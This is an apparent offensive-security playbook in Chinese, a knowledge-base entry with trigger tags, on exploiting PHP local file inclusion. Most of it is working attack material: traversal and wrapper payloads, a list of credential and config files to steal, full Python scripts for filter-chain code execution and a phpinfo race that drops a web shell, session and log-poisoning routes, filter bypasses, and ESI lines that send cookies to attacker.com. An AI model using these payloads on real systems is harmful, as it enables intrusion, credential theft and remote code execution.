---
category: web
tags: [lfi, local file inclusion, 本地文件包含, 文件包含, path traversal, 路径穿越, directory traversal, 目录遍历, php wrapper, php filter, rce, 远程代码执行, file read, 任意文件读取]
triggers: [include, require, require_once, include_once, file_get_contents, readfile, fopen, "php://filter", "php://input", "data://", "../", "..\\", "/etc/passwd", path, file, page, template, lang, dir, doc, LFI, 文件包含, 路径穿越]
related: [command_injection, xxe, file_upload, ssrf]
---

# LFI（Local File Inclusion / 本地文件包含）

## 什么时候用

- URL 参数直接拼入 `include`/`require`/`file_get_contents` 等文件操作函数
- 参数名暗示文件路径：`?page=`、`?file=`、`?template=`、`?lang=`、`?path=`、`?doc=`
- 响应中出现 PHP 警告如 `include(): Failed opening`、`file_get_contents(): failed to open stream`
- 目标使用 PHP 且存在动态模板加载逻辑

## 前提条件

- 存在可控的文件路径参数，且服务器端未做充分校验
- 目标语言/框架支持文件包含（PHP 最典型，Java/Python/Node 也可能存在类似问题）
- 根据利用深度不同，可能需要特定的 PHP 配置（`allow_url_include`、`file_uploads` 等）

## 攻击步骤

### 1. 基本路径穿越（Path Traversal）

确认 LFI 存在：

```bash
# Linux
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=/etc/passwd

# Windows
?file=..\..\..\..\windows\win.ini
?file=C:\Windows\win.ini
```

高价值文件读取清单：

```
# Linux
/etc/passwd
/etc/shadow
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0-20
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log

# PHP 专用
/etc/php/{version}/apache2/php.ini
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/php*  (临时上传文件)

# Web 应用
.env
config.php
wp-config.php
```

### 2. PHP Wrapper 利用

#### php://filter — 读取源码（无需 RCE）

```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=string.rot13/resource=config.php
?file=php://filter/convert.iconv.utf-8.utf-16/resource=config.php
```

#### php://input — 直接执行 POST 内容

需要 `allow_url_include=On`：

```bash
curl -X POST "http://target/?file=php://input" -d '<?php system("id"); ?>'
```

#### data:// — 内联执行 payload

需要 `allow_url_include=On`：

```bash
?file=data://text/plain,<?php system("id"); ?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==
```

#### expect:// — 直接执行命令

需要安装 expect 扩展（较少见）：

```
?file=expect://id
```

### 3. LFI → RCE 路线

#### 方式 A：PHP Filter Chain（无需写文件，首选）

利用 `convert.iconv` 系列 filter 构造任意 base64 → 解码为 PHP 代码，无需上传/写入任何文件。

**原理**：`convert.iconv.UTF8.CSISO2022KR` 始终在字符串开头添加 `\x1b$)C`，通过精心选择的 iconv 编码转换链，可以逐字符构造任意 base64 内容，最终 base64 解码得到 PHP 代码。

**自动化工具**（推荐）：
- [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) — 生成 filter chain
- [wrapwrap](https://github.com/ambionics/wrapwrap) — 支持添加前后缀
- [lightyear](https://github.com/ambionics/lightyear) — 盲文件读取 oracle

```bash
# 使用 php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;?>'
# 生成: php://filter/convert.iconv.../resource=php://temp

# 发送请求
curl "http://target/?file=<生成的chain>&0=id"
```

**手动脚本**：

```python
import requests

url = "http://target/index.php"
file_to_use = "php://temp"
command = "/readflag"

base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"  # <?=`$_GET[0]`;;?>

conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
}

filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
filters += "convert.iconv.UTF8.UTF7|"

for c in base64_payload[::-1]:
    filters += conversions[c] + "|"
    filters += "convert.base64-decode|"
    filters += "convert.base64-encode|"
    filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"
final_payload = f"php://filter/{filters}/resource={file_to_use}"

r = requests.get(url, params={"0": command, "file": final_payload})
print(r.text)
```

**进阶：Error-Based Filter Oracle（盲读文件）**

当 LFI 无回显时，可利用 iconv 内存炸弹 + `dechunk` 构建 1-bit oracle，逐字节泄露文件内容：

- [php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) — Synacktiv 出品
- [lightyear](https://github.com/ambionics/lightyear) — digit-set jumps，GET 长度友好

#### 方式 B：phpinfo() + Race Condition

**前提**：存在可访问的 `phpinfo()` 页面 + LFI + `file_uploads=On`

**原理**：PHP 接收 multipart 上传时创建临时文件（`/tmp/php[a-zA-Z0-9]{6}`），phpinfo() 的 `$_FILES` 输出泄露 `tmp_name`。通过 padding 使 phpinfo 响应提前 flush，在临时文件被删除前通过 LFI 包含执行。

```python
#!/usr/bin/env python3
import re, html, socket, threading

HOST = 'target.local'
PORT = 80
PHPSCRIPT = '/phpinfo.php'
LFIPATH = '/vuln.php?file=%s'
THREADS = 10

PAYLOAD = "<?php file_put_contents('/tmp/.p.php', '<?php system($_GET[\"x\"]); ?>'); ?>\r\n"
BOUND = '---------------------------7dbff1ded0714'
PADDING = 'A' * 6000

REQ1_DATA = (f"{BOUND}\r\n"
             f"Content-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n"
             f"Content-Type: text/plain\r\n\r\n{PAYLOAD}{BOUND}--\r\n")

REQ1 = (f"POST {PHPSCRIPT}?a={PADDING} HTTP/1.1\r\n"
        f"Host: {HOST}\r\nCookie: sid={PADDING}; o={PADDING}\r\n"
        f"User-Agent: {PADDING}\r\nAccept-Language: {PADDING}\r\nPragma: {PADDING}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
        f"Content-Length: {len(REQ1_DATA)}\r\n\r\n{REQ1_DATA}")

pat = re.compile(r"\[tmp_name\]\s*=&gt;\s*([^\s<]+)")

def race_once():
    s1, s2 = socket.socket(), socket.socket()
    s1.connect((HOST, PORT)); s2.connect((HOST, PORT))
    s1.sendall(REQ1.encode())
    buf, tmp = b'', None
    while True:
        chunk = s1.recv(4096)
        if not chunk: break
        buf += chunk
        m = pat.search(html.unescape(buf.decode(errors='ignore')))
        if m:
            tmp = m.group(1); break
    ok = False
    if tmp:
        lfi = f"GET {LFIPATH % tmp} HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n"
        s2.sendall(lfi.encode())
        ok = b'.p.php' in s2.recv(4096)
    s1.close(); s2.close()
    return ok

if __name__ == '__main__':
    for _ in range(500):
        if race_once():
            print('[+] Payload dropped: /tmp/.p.php')
            break
```

#### 方式 C：PHP_SESSION_UPLOAD_PROGRESS（Session 文件包含）

**前提**：`session.upload_progress.enabled=On`（默认开启），知道 session 存储路径

**原理**：即使 `session.auto_start=Off`，通过 multipart POST 发送 `PHP_SESSION_UPLOAD_PROGRESS` 字段 + `Cookie: PHPSESSID=xxx`，PHP 自动创建 session 文件，内容包含攻击者可控的上传进度字符串。

```bash
# 创建包含恶意内容的 session 文件
curl http://target/ -H 'Cookie: PHPSESSID=evil' \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php system("id"); ?>' \
  -F 'file=@/etc/passwd'

# 通过 LFI 包含 session 文件
curl "http://target/?file=/var/lib/php/sessions/sess_evil"
```

**注意**：默认 `session.upload_progress.cleanup=On`，上传进度在请求结束后立即清理，需要 race condition。session 内容带有前缀 `upload_progress_`，可通过三次 base64 编码/解码去除前缀：

```
?file=php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_evil
```

Session 文件常见路径：`/var/lib/php/sessions/`、`/tmp/`、`/var/tmp/`

#### 方式 D：Nginx 临时文件 + procfs

**前提**：PHP 运行在 Nginx 反向代理后，Nginx 启用了请求体缓冲（默认行为）

**原理**：请求体 >8KB 时 Nginx 将内容刷写到 `/var/lib/nginx/body/` 或 `/tmp/nginx/client-body/` 下的临时文件，保持文件描述符打开。通过 `/proc/<pid>/fd/<fd>` 可在文件被 unlink 后仍然访问。

```python
#!/usr/bin/env python3
import os

def find_tempfds(pid_range=range(100, 4000), fd_range=range(10, 80)):
    for pid in pid_range:
        fd_dir = f"/proc/{pid}/fd"
        if not os.path.isdir(fd_dir):
            continue
        for fd in fd_range:
            try:
                path = os.readlink(f"{fd_dir}/{fd}")
                if "client-body" in path or "nginx" in path:
                    yield pid, fd, path
            except OSError:
                continue

for pid, fd, path in find_tempfds():
    print(f"?file=/proc/{pid}/fd/{fd}  # {path}")
```

攻击流程：
1. 枚举 Nginx worker PID（读 `/proc/<pid>/cmdline`）
2. 发送大 POST body（>8KB）让 Nginx 写入临时文件，保持连接不关闭
3. 爆破 `/proc/<pid>/fd/<fd>`（fd 通常在 10-45 范围）
4. 命中后 `include` 执行 payload

#### 方式 E：Segmentation Fault 保留临时文件

**前提**：PHP 7.0 或 PHP 7.2

触发段错误后，PHP 不会清理本次请求的临时上传文件：

```php
// PHP 7.0
include("php://filter/string.strip_tags/resource=/etc/passwd");

// PHP 7.2
include("php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA");
```

```python
import requests

url = "http://target/?file=php://filter/string.strip_tags/resource=/etc/passwd"
files = {'file': ('shell.php', b'<?php system($_GET["cmd"]); ?>')}
requests.post(url, files=files)

# 临时文件保留在 /tmp/php[a-zA-Z0-9]{6}，需爆破文件名
```

#### 方式 F：Eternal Waiting（永久等待）

**前提**：目标可访问 `/sys/kernel/security/apparmor/revision`（Docker 容器中不可用）

**原理**：包含该文件导致 PHP 进程永久阻塞，上传的临时文件不被删除。利用剩余连接爆破 `/tmp/php*` 文件名。

- 149 个连接上传文件（149×20=2980 个临时文件）
- 最后 1 个连接爆破文件名

⚠️ 文件名空间为 62^6 ≈ 568 亿，需配合 PHP-FPM `request_terminate_timeout` 加速（30s 超时 → 进程被杀但文件保留）。

#### 方式 G：compress.zlib:// + Race Condition

**前提**：知道临时文件路径

```php
file_get_contents("compress.zlib://http://attacker.com/file")
```

攻击者控制的服务器先返回合法 HTTP 响应，保持连接打开。PHP 将内容写入临时文件。在 Web 服务器检查文件内容（如禁止 `<?`）之后、加载文件之前，攻击者通过仍然打开的连接发送 PHP payload。

#### 方式 H：pearcmd.php（register_argc_argv）

**前提**：`register_argc_argv=On`，pearcmd.php 可通过 LFI 包含

```
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[0]);?>+/tmp/shell.php
# 然后包含 /tmp/shell.php
?file=/tmp/shell.php&0=id
```

Docker 官方 PHP 镜像默认包含 pearcmd.php 且 `register_argc_argv=On`。

#### 方式 I：日志文件注入（Log Poisoning）

**前提**：知道日志文件路径 + 可写入恶意内容

```bash
# 1. 注入 PHP 代码到 User-Agent
curl http://target/ -A '<?php system($_GET["cmd"]); ?>'

# 2. 包含日志文件
?file=/var/log/apache2/access.log&cmd=id
?file=/var/log/nginx/access.log&cmd=id

# 其他日志路径
/var/log/auth.log      # SSH 登录日志（用户名注入）
/var/log/mail.log      # 邮件日志
/proc/self/environ     # 环境变量（User-Agent 可能出现）
/proc/self/fd/2        # stderr
```

### 4. 常见绕过

#### 后缀限制绕过

```bash
# Null byte（PHP < 5.3.4）
?file=../../../etc/passwd%00

# 路径截断（PHP < 5.3 + magic_quotes_gpc=Off）
?file=../../../etc/passwd............[超长]

# php://filter 的 resource 参数后可附加任意后缀
?file=php://filter/convert.base64-encode/resource=index
# 即使拼接 .php 也能正常工作

# php://temp 忽略后缀
?file=php://temp  → 即使变成 php://temp.php 也有效
```

#### 路径前缀/白名单绕过

```bash
# 双重编码
?file=%252e%252e%252fetc/passwd

# ../ 变体
?file=....//....//etc/passwd
?file=..%2f..%2f..%2fetc/passwd
?file=%2e%2e/%2e%2e/etc/passwd
?file=..%252f..%252f..%252fetc/passwd

# 利用软链接
?file=/proc/self/root/proc/self/root/etc/passwd
```

#### open_basedir 绕过

```bash
# glob:// 列目录
?file=glob:///var/www/*

# ini_set 动态修改
ini_set('open_basedir', '/');
```

#### WAF 绕过

```bash
# 大小写混合
?file=....//....//ETC/passwd

# PHP wrapper 混淆
?file=PHP://Filter/convert.Base64-encode/resource=index.php

# 使用长路径（超过 WAF 检查长度）
?file=./././././././././../../../etc/passwd
```

## 常见坑

- `include()` 和 `file_get_contents()` 行为不同：前者**执行** PHP 代码，后者只**读取**内容
- Null byte 截断在 PHP 5.3.4+ 已修复，不要浪费时间
- `allow_url_include=Off`（默认）时 `php://input`、`data://`、`http://` 均不可用，但 `php://filter` 不受此限制
- phpinfo race 需要精确调优 padding 大小，不同环境差异大
- PHP Filter Chain payload 很长（通常 >10KB URL），注意 URL 长度限制（Apache 默认 8190 字节，Nginx 默认 4096-8192 字节）
- Docker 容器通常没有 `/sys/kernel/security/apparmor/revision`，eternal waiting 方式不可用
- Session 文件路径因发行版而异：Debian `/var/lib/php/sessions/`，CentOS `/var/lib/php/session/`，自定义 `session.save_path`
- Nginx 临时文件方式需要知道 worker PID，且 fd 爆破可能很慢

## 变体

### SSI 注入（Server Side Includes）

服务器端包含指令，文件扩展名通常为 `.shtml`/`.shtm`/`.stm`：

```
<!--#exec cmd="id" -->
<!--#include virtual="/etc/passwd" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#printenv -->
```

### ESI 注入（Edge Side Includes）

缓存层（Varnish、Squid、Akamai、Fastly）的包含指令：

```xml
<!-- 检测：如果回显 "hello" 则存在 ESI -->
hell<!--esi-->o

<!-- SSRF / 文件读取 -->
<esi:include src="http://attacker.com" />
<esi:include src="secret.txt" />

<!-- Cookie 窃取 -->
<esi:include src="http://attacker.com/?c=$(HTTP_COOKIE)" />

<!-- 结合 XSLT 触发 XXE -->
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```

检测 ESI 支持的响应头：`Surrogate-Control: content="ESI/1.0"`

## 相关技术

- [[command_injection]] — Log poisoning 需要命令注入的思路
- [[xxe]] — ESI + XSLT 可触发 XXE
- [[file_upload]] — 临时文件上传是多种 LFI→RCE 路线的基础
- [[ssrf]] — ESI `<esi:include src=...>` 本质上是 SSRF
